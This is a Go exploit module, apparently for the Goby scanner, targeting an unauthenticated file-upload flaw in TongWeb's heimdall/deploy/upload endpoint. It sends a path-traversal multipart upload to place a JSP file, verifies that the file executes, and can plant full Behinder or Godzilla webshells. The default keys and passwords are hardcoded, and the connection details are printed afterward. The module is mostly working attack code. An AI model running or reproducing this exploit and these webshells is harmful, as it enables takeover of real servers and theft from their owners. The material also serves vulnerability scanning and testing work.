package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongweb heimdall/deploy/upload file upload vulnerability",
    "Description": "<p>TongWeb Application Server is an enterprise-level application server owned by TongTech, providing a standard, secure, highly available, and feature-rich platform. It offers various containers and functional components, including web containers, EJB containers, RMI service containers, web service platforms, JCA services, database connection pools, transaction control components, and more.</p><p>The Tongweb heimdall is vulnerable to an unauthorized file upload vulnerability, which can be exploited by attackers to gain control over the server.</p>",
    "Product": "TongWeb-Server",
    "Homepage": "https://www.tongtech.com/",
    "DisclosureDate": "2023-07-18",
    "PostTime": "2023-07-19",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "header=\"TongWeb Server\" || banner=\"Server: TongWeb Server\"",
    "GobyQuery": "header=\"TongWeb Server\" || banner=\"Server: TongWeb Server\"",
    "Level": "3",
    "Impact": "<p>The Tongweb heimdall is vulnerable to an unauthorized file upload vulnerability, which can be exploited by attackers to gain control over the server.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability fix program. Please pay attention to updates in a timely manner: <a href=\"https://tongtech.com/dft/download.html\">https://tongtech.com/dft/download.html</a>.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2021-24778"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Tongweb heimdall/deploy/upload 文件上传漏洞",
            "Product": "东方通-TongWeb",
            "Description": "<p>TongWeb 应用服务器是东方通（TongTech）旗下的一款标准、安全、高可用并具丰富功能的企业级应用服务器，提供了各种容器和功能组件，包括Web容器、EJB容器、RMI服务容器、Web服务平台、JCA服务、数据库连接池、事务控制组件等。</p><p>Tongweb heimdall 存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://tongtech.com/dft/download.html\" target=\"_blank\">https://tongtech.com/dft/download.html</a><br></p>",
            "Impact": "<p>Tongweb heimdall 存在未授权文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "Tongweb heimdall/deploy/upload file upload vulnerability",
            "Product": "TongWeb-Server",
            "Description": "<p>TongWeb Application Server is an enterprise-level application server owned by TongTech, providing a standard, secure, highly available, and feature-rich platform. It offers various containers and functional components, including web containers, EJB containers, RMI service containers, web service platforms, JCA services, database connection pools, transaction control components, and more.</p><p>The Tongweb heimdall is vulnerable to an unauthorized file upload vulnerability, which can be exploited by attackers to gain control over the server.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix program. Please pay attention to updates in a timely manner: <a href=\"https://tongtech.com/dft/download.html\" target=\"_blank\">https://tongtech.com/dft/download.html</a>.<br></p>",
            "Impact": "<p>The Tongweb heimdall is vulnerable to an unauthorized file upload vulnerability, which can be exploited by attackers to gain control over the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10931"
}`
	sendPayloadFlagrPDm := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, ".jsp") {
			filename += ".jsp"
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/heimdall/deploy/upload?method=upload")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=e94192f0e51f15ee00ad461dc39d6871")
		postRequestConfig.Data = "\r\n--e94192f0e51f15ee00ad461dc39d6871\n\nContent-Disposition: form-data; name=\"file\"; filename=\"../../applications/heimdall/" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n--e94192f0e51f15ee00ad461dc39d6871--\r\n"
		//		postRequestConfig.Data = `\r\n--e94192f0e51f15ee00ad461dc39d6871
		//Content-Disposition: form-data; name="file"; filename="../../applications/heimdall/` + filename + `"
		//Content-Type: image/jpeg
		//
		//` + content + `
		//--e94192f0e51f15ee00ad461dc39d6871--`
		_, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return nil, err
		}
		getRequestConfig := httpclient.NewGetRequestConfig("/heimdall/" + filename)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(16)
			checkStr := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlagrPDm(hostInfo, filename, `<%="`+checkStr+`"%>`)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16)
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			}
			rsp, err := sendPayloadFlagrPDm(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if attackType != "custom" && webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType != "custom" && webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
